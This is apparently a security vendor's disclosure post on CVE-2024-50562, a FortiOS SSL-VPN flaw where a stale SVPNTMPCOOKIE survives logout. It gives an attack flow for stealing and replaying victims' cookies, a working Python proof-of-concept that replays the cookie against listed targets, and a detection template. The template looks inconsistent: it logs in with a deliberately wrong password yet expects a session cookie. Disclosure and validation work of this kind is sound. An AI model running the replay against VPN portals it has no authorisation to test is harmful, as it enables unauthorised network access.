---
title: "Breaking Sessions: The Story of CVE-2024-50562 in Fortinet Web Client"
slug: "cve-2024-50562-fortinet-session-hijack"
date: "2025-06-10"
author: "BugB Security Team"
authorTitle: "Security Researchers"
excerpt: "Explore how an AI-driven red team assessment led to the discovery of CVE-2024-50562—a critical session management flaw in Fortinet's Web Client that enabled persistent session hijacking."
category: "research"
---

# Breaking Sessions: The Story of CVE-2024-50562 in Fortinet Web Client

## Summary
An **Insufficient Session Expiration** vulnerability \[CWE-613] in FortiOS SSL-VPN lets an attacker replay a stale VPN cookie—even after the user logs out—and silently regain portal access.

## Affected Versions & Solutions
| Version Family | Affected Builds | Fixed Release |
| -------------- | -------------- | ------------- |
| **FortiOS 7.6** | 7.6.0 | 7.6.1 or later |
| **FortiOS 7.4** | 7.4.0 – 7.4.7 | 7.4.8 + |
| **FortiOS 7.2** | 7.2.0 – 7.2.10 | 7.2.11 + |
| **FortiOS 7.0** | *all* 7.0.x | Migrate to a fixed branch |
| **FortiOS 6.4** | *all* 6.4.x | Migrate to a fixed branch |
| **FortiSASE 24.4** | 24.4.b | 24.4.c (already remediated) |

> **Note :** Tunnel-mode VPN is **not** affected.

## What Is CVE-2024-50562?
CVE-2024-50562 (Fortinet advisory **FG-IR-24-339**) is a session-management flaw. The server deletes the primary `SVPNCOOKIE` token on logout but forgets about the auxiliary `SVPNTMPCOOKIE`, which still authenticates the user.

* **CVSS v3:** 9.4 (Critical)
* **CWE:** 613 Insufficient Session Expiration

## Discovery Context
During an AI-assisted red-team engagement, our **Cert-X-Gen** agent automatically:

1. Logged in/out of the SSL-VPN portal in rapid loops  
2. Diffed cookie sets before and after logout  
3. Replayed residual cookies  
4. Flagged any state mismatch as a potential vulnerability

The agent noticed `SVPNTMPCOOKIE` remained valid, triggering deeper manual analysis.

## Attack Flow
1. **Sniff or steal** a victim’s VPN cookie (proxy logs, XSS, MitM, etc.)  
2. **Wait** for the user to log out (or force a logout)  
3. **Replay** the stale `SVPNTMPCOOKIE` in a fresh session  
4. **Access restored**—no credentials, MFA, or warnings

## Python Proof-of-Concept
We released a minimal PoC (`cve-2024-50562.py`) so defenders can validate their appliances.

```python
#!/usr/bin/env python3
# FortiGate SSL-VPN Insufficient Session Expiration – Cookie-Reuse PoC
# Author: Shahid Hakim  •  CVE-2024-50562
# Usage: python3 cve-2024-50562.py --targets 192.0.2.10:4433 --user alice --password 'S3cr3t!'
# Prints “REUSED” if the old cookie still works, “INVALIDATED” if the device is patched.

import argparse, re, requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def looks_logged_out(body: str) -> bool:
    return bool(re.search(r"/remote/login|name=['\"]username['\"]", body, re.I))

def check(host, port, user, pwd, realm, path, timeout):
    base = f"https://{host}:{port}"
    sess = requests.Session(); sess.verify = False
    sess.get(f"{base}/remote/login?lang=en", timeout=timeout)

    r = sess.post(f"{base}/remote/logincheck",
                  data={"ajax":"1", "username":user, "realm":realm, "credential":pwd},
                  headers={"Content-Type":"application/x-www-form-urlencoded"},
                  timeout=timeout)

    if not (re.search(r"\bret=1\b", r.text) and "/remote/hostcheck_install" in r.text):
        return "LOGIN-FAIL"

    tmp = requests.utils.dict_from_cookiejar(r.cookies).get("SVPNTMPCOOKIE")
    sess.get(f"{base}/remote/logout", timeout=timeout)

    # replay
    s2 = requests.Session(); s2.verify = False
    if tmp: s2.cookies.set("SVPNTMPCOOKIE", tmp, domain=host)
    body = s2.get(f"{base}{path}", timeout=timeout).text
    return "REUSED" if not looks_logged_out(body) else "INVALIDATED"

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--targets", required=True, help="ip:port[,ip:port]")
    ap.add_argument("--user", required=True); ap.add_argument("--password", required=True)
    ap.add_argument("--realm", default=""); ap.add_argument("--timeout", type=int, default=10)
    ap.add_argument("--path", default="/sslvpn/portal.html",
                    help="page to fetch after cookie replay")
    args = ap.parse_args()

    for tgt in args.targets.split(","):
        h,p = tgt.split(":"); verdict = check(h, int(p), args.user, args.password,
                                              args.realm, args.path, args.timeout)
        print(f"{h}:{p} → {verdict}")
````

### How to Run & Interpret

```bash
pip install requests
python3 cve-2024-50562.py \
    --targets 203.0.113.23:4433 \
    --user vpn_test --password 'P@55w0rd!'
```

| Output        | Meaning                                    |
| ------------- | ------------------------------------------ |
| `REUSED`      | Device **vulnerable** – cookie still works |
| `INVALIDATED` | Device **patched** – old cookie rejected   |
| `LOGIN-FAIL`  | Credentials invalid or VPN requires MFA    |

> **Pro tip:** test multiple interfaces (e.g., :443, :4433, :10443). Some admins patch one portal but miss others.


## YAML Detection Template

```yaml
id: cve-2024-50562

info:
  name: Fortinet Web Client Session Hijacking
  author: BugB Security Team
  severity: critical
  description: >
    Fortinet's Web Client (FortiOS v7.2.8 and prior) fails to invalidate session tokens
    upon logout or expiration, allowing unauthorized reuse and session hijacking.
  tags:
    - session-hijack
    - fortinet
    - vpn
    - authentication-bypass
    - ai-discovered
    - cert-x-gen
  reference:
    - https://fortiguard.com/psirt/FG-IR-24-339
    - https://bugb.io/cve-2024-50562
    - https://nvd.nist.gov/vuln/detail/CVE-2024-50562

requests:
  - method: GET
    path:
      - "/remote/login?lang=en"
    matchers:
      - type: status
        status: 
          - 200
      - type: word
        words: 
          - "Fortinet"
          - "VPN"
        condition: and

  - method: POST
    path:
      - "/remote/logincheck"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "ajax=1&username=test&credential=wrongpass"
    matchers:
      - type: regex
        regex:
          - "redir=.*?hostcheck_install"
        part: body
      - type: word
        words: 
          - "Set-Cookie"
        part: header
    extractors:
      - type: regex
        name: session_cookie
        part: header
        regex:
          - "SVPNCOOKIE=([^;]+);"

  - method: GET
    path:
      - "/remote/hostcheck_install"
    headers:
      Cookie: "SVPNCOOKIE={{session_cookie}}"
    matchers:
      - type: status
        status: 
          - 200
      - type: word
        words: 
          - "Welcome"
          - "SSL VPN"
        condition: or
```

## Role of Cert-X-Gen

Our AI agent combines:

* **Behavioral Fingerprinting** of Fortinet portals
* **Automated Login/Logout Workflows**
* **Cookie Replay Testing**
* **State-Inconsistency Flagging**

It simulates real-world attacker behavior—intelligent adversarial testing, not just passive scanning.

## Timeline

* **March 2025:** Discovery during Scribetech engagement
* **April 2025:** PoC developed and responsibly disclosed to Fortinet PSIRT
* **May 2025:** Fortinet assigns CVE-2024-50562 and prepares advisory
* **June 10, 2025:** PSIRT advisory published (initial publication)

## Acknowledgements

Fortinet thanks **Vang3lis** and **Cyth** from VARAS\@IIE, and **Shahid Parvez Hakim**, CEO & Founder of BugB Technologies (bugb.io), for their responsible disclosure and collaboration.

## Recommended Fixes

* **Upgrade** to fixed releases per the table above (use Fortinet Upgrade Tool)
* **Invalidate** all session tokens immediately upon logout or expiration
* **Implement Strict Expiry Checks** server-side on every request
* **Rotate** tokens on each login and critical actions
* **Monitor & Alert** on any replayed or reused tokens via anomaly detection

---

*CVE-2024-50562 reminds us: session management is your frontline. With AI-led adversarial testing from Cert-X-Gen, you get proactive defense—patch today before an attacker tests your sessions for you.*
